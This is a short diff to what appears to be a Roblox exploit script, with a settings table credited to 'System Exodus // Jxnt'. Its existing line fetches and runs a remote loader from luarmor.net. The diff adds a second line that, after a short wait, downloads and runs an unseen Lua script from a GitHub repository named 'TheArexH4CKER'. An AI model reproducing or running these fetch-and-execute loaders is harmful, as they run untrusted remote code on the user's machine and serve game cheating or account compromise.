@@ -13,3 +13,6 @@ getgenv().Settings = {
     [[ Created by System Exodus // Jxnt ]]
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/dfadecec4b8a6d5083b7089f545a2fbf.lua"))()
+task.wait(5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TheArexH4CKER/enchntchcker/refs/heads/main/EnchntChcker.lua"))()
+
